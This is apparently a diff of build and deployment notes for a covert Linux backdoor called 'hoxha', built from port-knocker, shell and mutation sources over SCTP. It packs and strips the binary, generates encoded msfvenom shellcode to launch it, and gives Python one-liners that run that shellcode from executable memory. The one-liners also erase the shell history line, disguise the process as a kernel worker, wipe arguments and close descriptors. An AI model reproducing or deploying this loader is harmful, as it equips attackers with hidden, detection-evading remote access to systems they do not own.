@@ -1,6 +1,45 @@
-gcc -Oz -fno-stack-protector -fno-asynchronous-unwind-tables -Wl,-z,norelro -Wl,-O1 -nostartfiles -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 -s -Wa,--no-pad-sections -march=native -Wl,--build-id=none -Wl,-O1 -Wl,-z,separate-code -s -pipe sctp.c -o sctp -lsctp
-(Revise the above as it seems to brake client output, also work on the shell not closing if the client exits)
+# make
+cc knocker.c shell.c mutate.c -o hoxha -static -s -pipe -march=native -O2 --std=gnu17 -Wall -Wextra -pedantic -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 --no-data-sections -falign-jumps=1 -falign-labels=1 -flto -fipa-icf -z execstack -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -lsctp -lpthread
 
-/usr/bin/upx --best --brute sctp
+/usr/bin/upx --best --brute hoxha
 
-/usr/bin/sstrip -z sctp
+/usr/bin/sstrip -z hoxha
+
+# msfvenom -p linux/x64/exec CMD=/usr/bin/hoxha -f raw -o shellcode.bin -b "\x00\x0a\x0d"
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 95 (iteration=0)
+x64/xor chosen with final size 95
+Payload size: 95 bytes
+Saved as: shellcode.bin
+
+# cat shellcode.bin | base64
+SDHJSIHp+f///0iNBe////9Iu0MTh+gQijFTSDFYJ0gt+P///+L0C6uoinnkHiArEx64RNVjNSs+
+5LxO2NlcQxOHx2X5Q3wheunHeOVJOyIT0b9E1FtoGxyC6BCKMVM=
+
+python3 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp+f///0iNBe////9Iu0MTh+gQijFTSDFYJ0gt+P///+L0C6uoinnkHiArEx64RNVjNSs+5LxO2NlcQxOHx2X5Q3wheunHeOVJOyIT0b9E1FtoGxyC6BCKMVM="; shellcode = base64.b64decode(encoded_shellcode); mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC); mem.write(shellcode); addr = ctypes.addressof(ctypes.c_char.from_buffer(mem)); shell_func = ctypes.CFUNCTYPE(None)(addr); print("When the enemy attacks you, this means that you are on the right road."); shell_func()' && history -d $(history | awk 'END { print $1 }')
+When the enemy attacks you, this means that you are on the right road.
+
+
+python3 -c 'import base64,mmap,ctypes,sys,os
+encoded_shellcode="SDHJSIHp+f///0iNBe////9Iu0MTh+gQijFTSDFYJ0gt+P///+L0C6uoinnkHiArEx64RNVjNSs+5LxO2NlcQxOHx2X5Q3wheunHeOVJOyIT0b9E1FtoGxyC6BCKMVM="
+shellcode=base64.b64decode(encoded_shellcode)
+mem=mmap.mmap(-1,len(shellcode),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC)
+mem.write(shellcode)
+addr=ctypes.addressof(ctypes.c_char.from_buffer(mem))
+shell_func=ctypes.CFUNCTYPE(None)(addr)
+[sys.argv.__setitem__(i,"\0"*len(sys.argv[i])) for i in range(len(sys.argv))]
+libc=ctypes.CDLL(None)
+libc.prctl(15,b"kworker/u9:1",0,0,0)
+for fd in os.listdir("/proc/self/fd"):
+    if fd.isdigit():
+        fd_int=int(fd)
+        if fd_int > 2:
+            try:
+                os.close(fd_int)
+            except OSError:
+                pass
+print("When the enemy attacks you, this means that you are on the right road.")
+shell_func()'
